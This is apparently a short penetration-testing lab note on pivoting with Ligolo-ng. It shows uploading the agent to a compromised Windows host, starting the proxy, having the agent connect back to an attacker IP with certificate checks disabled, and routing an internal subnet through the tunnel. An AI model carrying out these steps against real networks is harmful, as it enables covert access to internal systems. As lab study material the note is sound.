
# Ligolo-ng
download ligolo agent
[Releases · nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng/releases) 
```powershell
upload '/home/kali/ligolo-ng/ligolo-agent.exe' 'ligolo-agent.exe'
```

```shell
sudo ip tuntap add user $(whoami) mode tun ligolo sudo ip link set ligolo up
sudo ip link set ligolo up
 
sudo ./proxy -selfcert -api-laddr 0.0.0.0:8081
```

![](Attachments/Pasted%20image%2020260811105306.png)

connect agent
```shell
.\ligolo-agent.exe -connect 10.10.15.236:11601 -ignore-cert
```
![](Attachments/Pasted%20image%2020260811123750.png)

add session to ligolo -> start
![](Attachments/Pasted%20image%2020260811124554.png)

ada tunnel
```shell
sudo ip route add 192.168.100.0/24 dev ligolo
```
![](Attachments/Pasted%20image%2020260811125046.png)